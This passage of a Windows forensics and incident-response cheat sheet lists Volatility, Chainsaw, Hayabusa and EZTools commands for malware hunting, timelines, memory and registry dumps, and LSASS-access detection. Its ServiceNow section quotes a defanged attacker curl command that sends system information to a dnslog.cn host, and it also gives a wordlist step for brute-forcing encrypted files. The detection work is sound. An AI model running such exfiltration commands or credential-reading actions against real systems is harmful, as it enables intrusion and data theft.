Check for `attrib` command with `+h` (attempt to hide file) being executed on files such as `.ps1` script. It can also be used to detect malware such as [Lifetime-ETW-Patch](https://github.com/EvilBytecode/Lifetime-Amsi-EtwPatch/blob/main/Patcher.go) which turns off AMSI and ETW.

Taken from [LetsDefend Log4J's RCE exercise](https://files-ld.s3.us-east-2.amazonaws.com/Alert-Reports/Log4j_RCE_Detected.pdf)

#### via chainsaw / sigma

Detects any unusual activity from loaded sigma rules. More examples available [here](https://github.com/WithSecureLabs/chainsaw?tab=readme-ov-file#command-examples-1)
```
C:\Users\Administrator\Desktop\opt\chainsaw\chainsaw\chainsaw.exe hunt C:\Windows\Temp\Logs -s C:\Users\Administrator\Desktop\opt\sigma\sigma-master -r C:\Users\Administrator\Desktop\opt\sigma\sigma-master\rules --mapping C:\Users\Administrator\Desktop\opt\chainsaw\chainsaw\mappings\sigma-event-logs-all.yml --csv --output C:\Windows\Temp\out.csv
```

#### via velocirpator / DetectRaptor

Load the latest [DetectRaptor VQL](https://github.com/mgreen27/DetectRaptor/tree/master) Zip artifact into Velociraptor and launch YaraProcessWin Artifact which will search for malware based on YaraForge.

Consider also looking for WebShellYara Artifact which will search for webshells based on YaraForge

### Identify Downloaded files

Certain actions such as LSA Dumping can also write files to this location

#### via Explorer

See following locations:
```
# Downloaded files
C:\Windows\Temp
C:\Users\$USER_ID\Desktop
C:\Users\$USER_ID\Downloads
C:\Users\$USER_ID\Documents
C:\Users\$USER_ID\AppData\Local\Temp

# Location where webdav downloaded files are located: https://dfir.ch/posts/today_i_learned_webdav_cache/
C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV\
```

#### via Sysmon Windows Event ID 11 / File Create Event

```
# 'TargetFileName' contains the path to the new file being written
Event ID = 11
Channel = Microsoft-Windows-Sysmon/Operational
Description = File Created
```

These could also be used to detect malware which may create powershell files such as .ps1 such as `Lifetime-ETW-Patch` which creates a file in Documents directory and makes it appear as though it is a System file in use. 

```
# 'TargetFileName' contains the path to the new file being written
Event ID = 11
Channel = Microsoft-Windows-Sysmon/Operational
Description = File Created
TargetFileName = C:\Users\*\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
```


### Extract Files from image

#### via volatility3 / dumpfiles

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem dumpfiles --virtaddr 0xa001c401ed40
deactivate
```

#### via volatility2 / dumpfiles

```
# Use address from filescan to extract the address
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem dumpfiles --profile=Win10x64_19041 -Q 0x000000003f4bca20 -D ./dumpfiles -u
deactivate
```

### List kernel modules

#### via volatility3 / windows.modules

Command also dumps kernel modules for a process

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.modules.Modules
deactivate
```

#### via volatility3 / windows.modscan

Command also dumps kernel modules for a process

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.modscan
deactivate
```

#### via volatility2 / modscan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem modscan
deactivate
```


### Dump processes

#### via volatility3 / dumpfiles

Command also dumps DLLs for a process
```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem windows.dumpfiles.DumpFiles --pid 8883
deactivate
```

#### via volatility2 / procdump

```
source /opt/volatility2/venv/bin/activate
mkdir ./dumpfiles
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem procdump --pid 7916 --dump-dir=$(pwd)/dumpfiles
deactivate
```

#### via volatility3 / pslist

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.pslist.PsList --dump --pid 7916
deactivate
```

### Get the DLLs for a process

#### via volatility2 / dlllist

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem dllist -p 7916
deactivate
```

#### via volatility3 / dlllist

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.dlllist.DllList --pid 7916
deactivate
```

### Get unusual File Handles opened by process

- Can be used to detect process attempts to read credentials from Lsass memory eg for golden ticket attack eg [here](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#golden-ticket-attack)

#### via Windows Event Logs / Event ID 4656

```
# Process Information.Process Name contains the name of the process which is reading the LSASS memory
# Access request information.Accesses contains privileged requests like 'Read from process memory'
Channel = Security
Object.Object Name = \Device\HarddiskVolume3\Windows\System32\lsass.exe
EventID = 4656 (A Handle to an object was requested)
```

#### via volatility2 / handles

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem handles --pid 7916
deactivate
```

#### via volatility3 / handles

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.handles.Handles --pid 7916
deactivate
```

### Build a timeline

*Key Artifacts* to focus on for a high-level idea:
- Command Executions / CommandLine (e.g. sysmon process create )
- Command Scripting Interpreter (e.g. powershell, bash)
- Scheduled Jobs (e.g. scheduled tasks)
- File Opened / Creations

#### via volatility3 / timeliner.Timeliner

Runs all volatility3 modules to ensure that timeline is built

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem timeliner.Timeliner
deactivate
```

#### via plaso

Assuming `dd` / `E01` image has been taken and mounted on linux host with name `charlie-work-usb....`:

```
# Build an SQLITE timeline
docker run --rm -v /tmp:/data -v $(pwd):/in -it log2timeline/plaso log2timeline.py /in/charlie-work-usb-2009-12-11.e01  --storage_file /data/log2timeline.data
# Convert format to CSV
docker run --rm -v /tmp:/data -v $(pwd):/in -it log2timeline/plaso psort.py -w /data/log2timeline.csv /data/log2timeline.data
```
taken from [here](https://www.forensics-matters.com/2020/10/17/forensics-timeline-using-plaso-for-windows/)

#### via Autopsy

Use Tools > Timeline Analysis option to view the timeline. Additionally, it is possible to select `Linear` or `Logarithmic` scale to view the timeline. 
To see the details, switch from Mode `Counts` to `Details` in Autopsy.

A tutorial of using `Autopsy`'s timeline analysis is available [here](https://www.sleuthkit.org/autopsy/timeline.php)

#### via Eric Zimmerman's EvtxECmd

```
C:\Users\Administrator\Desktop\opt\EZTools\EvtxECmd\EvtxECmd.exe -d C:\Windows\System32\winevt\Logs --csv C:\Windows\Temp --csvf timeline.csv
```

#### via hayabusa

Hayabusa can also scan via sigma ruleset.

```
# Update sigma ruleset in hayabusa dir
cd C:\Users\Administrator\Desktop\opt\hayabusa
.\hayabusa-2.16.0-win-x64.exe update-rules
# Scan the log files and also build a timeline that can be opened in Timeline Explorer, Excel or Timesketch?
.\hayabusa-2.16.0-win-x64.exe csv-timeline -d C:\Windows\Temp\Logs -o C:\Windows\Temp\results.csv
```

### Dump process memory

#### via volatility2 / memdump

```
source /opt/volatility2/venv/bin/activate
mkdir ./dumpfiles
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem memdump --pid 7916 --dump-dir=$(pwd)/dumpfiles
deactivate
```

#### via volatility3 / memmap

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.memmap.Memmap --dump --pid 7916
deactivate
```

### Look for Recently Executed Applications

#### via volatility2 / userassist

Detects GUI Programs run on the System
```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem userassist
deactivate
```

#### via volatility3 / userassist

Detects GUI Programs run on the System

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.registry.userassist.UserAssist
deactivate
```

#### via shimcache / eric zimmerman's appcompatcacheparser

Registry is Located in `SYSTEM\CurrentControlSet\Control\SessionManager\Appcompatibility\AppcompatCache`

```
C:\Users\Administrator\Desktop\opt\EZTools\net6\AppCompatCacheParser.exe -f C:\Windows\System32\config\SYSTEM --csv C:\Windows\Temp --csvf appcompatcacheparser.csv
```

#### via Windows Defender Logs

```
# Check for 'BM Telemetry' OR '.exe' in logs at following locations e.g. MPLog-*.txt
# Taken from: https://www.thedfirspot.com/post/windows-defender-mp-logs-a-story-of-artifacts
C:\ProgramData\Microsoft\Windows Defender\Support\*.txt
```

### Check for installed applications 

Look for any applications running as servers and that could be exploited eg

```
# Indicative of cloudburst powershell-based malware as described here: https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/
C:\Program Files (x86)\Microsoft Intune Management Extension\Policies\Scripts
```

#### via wmic

```
wmic product get name, version
```

#### via Program Folders

Possible Locations:
- C:\Program Files
- C:\Program Files (x86)
- C:\Program data

#### via powershell

```
Get-WmiObject -Class Win32_Product
```

### Check various installed Application Logs

- Can provide indications of any exploits especially for running servers such as TightVNC, Mail servers, etc.
- Can also provide forensics artifacts eg SHA and file paths

#### via Program Files 

Common location for logs:

- Microsoft Windows Defender: See Windows Defender Logs [here](#via-windows-defender-logs). Can indicate SHA-1 hashes and the paths to the processes executed.

- ShareTool: `C:\PerfLogs\write-test.shareaudit`. Taken from [here](https://x.com/malmoeb/status/1825085850092220432)

- Minecraft: `C:\Users\LetsDefend\Desktop\Minecraft Server 1.12.2\logs`
  
- Fortinet EMS Logs: `C:\Program Files (x86)\Fortinet\FortiClientEMS\logs\`. Taken from [here](https://www.linkedin.com/posts/stephan-berger-59575a20a_my-team-colleague-asger-deleuran-s-investigated-activity-7217564988436033539-Sw0u?utm_source=share&utm_medium=member_ios)
  
- ServiceNow: `\\ServiceNow MID Server MID_Server_Prod\agent\logs\agent0.log.*`. Search for the following lines: `Dispatching event: 'MessageDispatchedEvent, message: Command <cmd>` which can show the commands being executed on servicenow especially due to remote code execution e.g. `curl hxxp://w2wlxu.dnslog.cn/?x=$(uname) -a|base64 -w0)`, as taken from [here](https://x.com/malmoeb/status/1814614969771544923)

#### via ProgramData

- Symantec Endpoint Protection: `C:\ProgramData\Symantec\Symantec Endpoint Protection\CurrentVersion\Data\Logs`: Leverage [SEParser](https://github.com/Beercow/SEPparser) to extract packets from Firewall Packet log, Parse ccSubSDK data into csv reports, Extract potential binary blobs from ccSubSDK, Parse VBN files into csv reports, etc.

- Intune Management Extension: `C:\ProgramData\Microsoft\IntuneManagementExtension\Logs\IntuneManagementExtension-YYYYMMDD-HHMMSS.log` can indicate powershell scripts being identified via Intune (sometimes malicious) as described by Mandiant [here](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/) > `Reaching for the Clouds: Intune with CLOUDBURST`
  
#### via dir / C: / System32 logs

```
# Look for .log file extension
dir /b /s C:\Windows\System32 | findstr /I "\.log"

# Look for .txt files which could be logs
dir /b /s C:\Windows\System32 | findstr /I "\.txt" | findstr /I log
```


### List Windows Registry Keys


#### via volatility2 / hivelist

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem hivelist
deactivate
```

#### via volatility3 / hivelist

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.registry.hivelist.HiveList
deactivate
```

### Print specific registry key

#### via volatility2 / printkey

```
# Use offset from hive list to dump correct registry
source /opt/volatility3/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem printkey -K "Software\Microsoft\Windows\CurrentVersion" -o 0xffffb50579465000 
deactivate
```

#### via volatility3 / printkey

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem printkey -o 0xb50579ead000 -k 
deactivate
```

### dump Windows Registry Keys

#### via volatility2 / dumpregistry

```
# Read the registry using virtual addresses from hivelist obtained via printkey command
# vol -f test.raw windows.registry.printkey.PrintKey
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem dumpregistry-o 0xffffb50579ead000
deactivate
```
Taken from [here](https://medium.com/@0xcc00/bypassing-edr-ntds-dit-protection-using-blueteam-tools-1d161a554f9f)

#### via volatility2 / hivedump

```
# Read the registry using the virtual address from hivelist
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem hivedump -o 0xffffb50579ead000
deactivate
```

#### via volatility3 / hivelist

Filter using the output from `hivelist` command [here]([#via-volatility3--hivelist))

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.registry.hivelist.HiveList --filter "Work\ntuser.dat" --dump
deactivate
```

### WMI Event Consumers Analysis

#### via wmi-parser / chainsaw

To detect [malicious event consumers](https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96), we can use `wmi-parser` to examine the current machine's WMI Event Consumers which could be both filtering and consuming WMI events (malicious indicators). The files are available in `C:\WINDOWS\system32\wbem\Repository\OBJECTS.DATA` OR `C:\WINDOWS\system32\wbem\Repository\FS\OBJECTS.DATA` folders.

```
.\wmi-parser.exe -i $PATH_TO_REPOSITORY\Repository\OBJECTS.DATA
```

If Sysmon is installed, then WMI Event Consumers will also appear in the sysmon logs in Event ID 19, 20, 21 as explained [here](https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96). These can be detected in Windows logs using `chainsaw`

```
.\chainsaw.exe search -t 'Event.System.EventID: =19' -t 'Event.System.Channel: Microsoft-Windows-Sysmon/Operational' C:\Windows\System32\winevt\Logs
# WmiEventConsumer - This will show the malicious code which executes when the WMI event is initiated
.\chainsaw.exe search -t 'Event.System.EventID: =20' -t 'Event.System.Channel: Microsoft-Windows-Sysmon/Operational' C:\Windows\System32\winevt\Logs
.\chainsaw.exe search -t 'Event.System.EventID: =21' -t 'Event.System.Channel: Microsoft-Windows-Sysmon/Operational' C:\Windows\System32\winevt\Logs
```

### Google Chrome Notifications

#### via strings

If Google Chrome is in use and Notifications are enabled for website, then historical notifications are usually available in the `%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Platform Notifications` as LevelDB Database. Extract the file and determine the clear-text notifications that a user may have received via `strings` or `xxd`. More info available [here](https://www.sans.org/blog/google-chrome-platform-notification-analysis/), [here](https://www.linkedin.com/pulse/investigating-abusive-push-notification-browsers-chrome-jimmy-remy/) and the structure of the LevelDB database is described [here](https://sansorg.egnyte.com/dl/QaoN3qdhig)

```
strings MANIFEST/*
strings *.ldb
```

### Get Boot sector information

#### via MFTECmd / $Boot
```
C:\Users\Administrator\Desktop\opt\EZTools\net6\MFTECmd.exe -f 'C:\Windows\Temp\C\$Boot' --csv C:\Windows\Temp --csvf Boot.csv
```

### Check created and deleted files 

#### via windows sysmon event ID 26 / windows sysmon event ID 23

```
EventID: 23
Channel: Microsoft-Windows-Sysmon/Operational
```

#### via Usn Journal ($J)

Extract the USN Journal which can contain useful information about created and deleted files as described [here](https://x.com/inversecos/status/1453588917337268233?s=20)
```
.\ExtractUsnJrnl64.exe /DevicePath:C: /OutputPath:C:\Windows\Temp
```

Parse the USN Journal for CSV output: 
```
.\UsnJrnl2Csv64.exe /UsnJrnlFile:C:\Windows\Temp\UsnJrnl_$J.bin
```

#### via Kape / MFTECmd / $J

Use Kape as described [here](#via-kroll-kape) to collect `$EXTEND\$J`
```
# Assumed that Kape used to obtain $Extend/$J (via SANS Triage)
C:\Users\Administrator\Desktop\opt\EZTools\net6\MFTECmd.exe -f "E:\C\$Extend\$J" --csv C:\Windows\Temp --csvf MFT-J.csv
```

#### via Kape / MFTEcmd / $Logfile

Use Kape as described [here](#via-kroll-kape) to collect `$LogFile`

As described [here](https://superuser.com/a/577272), the `$Logfile` is a special NTFS system file. It is a circular log of all disk operations and is used to roll back disk operations. 

```
# Assumed that Kape used to obtain $Extend/$J (via SANS Triage)
C:\Users\Administrator\Desktop\opt\EZTools\net6\MFTECmd.exe -f "E:\C\$LogFile" --csv C:\Windows\Temp --csvf Logfile.csv
```

For timestomping, look for criteria: 
```
Operation: CreateAttribute
Filename: file.txt (or your filename)
CurrentAttribute: $FILE_NAME 
```

Taken from [here](https://www.inversecos.com/2022/04/defence-evasion-technique-timestomping.html)

#### LogFileParser / $LogFile

```
# Use EZViewer to view the generate log file
cd C:\Users\Administrator\Desktop\opt\LogFileParser
.\LogFileParser64.exe /LogFileFile:'C:\Windows\Temp\C\$LogFile' /OutputPath:C:\Windows\Temp\ /Separator:","
```

#### via fsutil

```
fsutil usn readjournal c: csv > C:\Windows\Temp\usnjournal.csv
````

Taken from [here](https://www.reddit.com/r/screensharing/comments/k30iw0/how_to_dump_usn_journal_to_readable_format/)

### Windows Registry Paths

Following registries present in `C:\Windows\System32\config`:
- SAM
- SYSTEM
- SECURITY
- SOFTWARE
- DEFAULT
- COMPONENTS

Following registries are present in `C:\Users\$USERNAME`:
- NTUSER.DAT

Following registries are present in `C:\Users\$USERNAME\AppData\Local\Microsoft\Windows`:
- UsrClass.dat

### Export Registry to file

#### via RegRipper

Saves registry as .txt file

### Extract Deleted Registry Keys

#### via RegExplorer

Ensure that Options > Recover Deleted keys/values is selected

The deleted keys/values then appaar in the left-hand navigation pane as unassociated records

### Get Device timezone

#### via Registry / System

See `System/CurrentControlSet/Control/TimeZoneInformation`

### Build a wordlist for Extracting password encrypted files

#### via bulk_extractor

The command below will create a wordlist from disk data (can be offline images such as E01, .raw volatility images) which could be used for testing files that are encrypted
```
bulk_extractor -E wordlist -o /tmp/bulk_extractor $DISK_PATH
```
The above command creates a `wordlist_dedup_1.txt` which can be used for brute-forcing. More info is available [here](https://www.raedts.biz/forensics/building-wordlists-forensic-images/).

### Detect time the system was turned on / off (timeline)

#### via TurnedOnTimesView

Capture the `System.evtx` file from `C:\Windows\System32\winevt\Logs` from the disk and store it in a new folder. Launch Nirsoft's `TurnedOnTimesView` utility > Options > Advanced Options > Select `Data Source` as `External Disk` > Point to the folder where `System.evtx` is added.

The times for start-up and shutdown are displayed for the system. Select all entries and copy/paste them to an .xlsx file for analysis. 

More info is [here](https://www.raedts.biz/forensics/find-system-powered/)

### Searching Windows Logs

#### via powershell / Get-WinEvent

```
Get-ChildItem -Path . | Select-Object -ExpandProperty Name | %{ Get-WinEvent -Path $_ } | Where-Object { $ _.ID -eq "4799" }

# Detect Process Access Sysmon (Event ID 10) Logs where Lsass is accessed
$events = Get-WinEvent -Path .\LsassDump.evtx |Where-Object {$_.ID -eq 10}
$events |Where-Object {$_.Properties[8].Value -Like '*Lsass*'} |Format-List
```

#### via chainsaw

See example [here](#via-wmi-parser--chainsaw)

#### via Eric Zimmerman's evtxecmd

See [EvtxEcmd](#via-eric-zimmermans-evtxecmd)

## Eradication

## Recovery
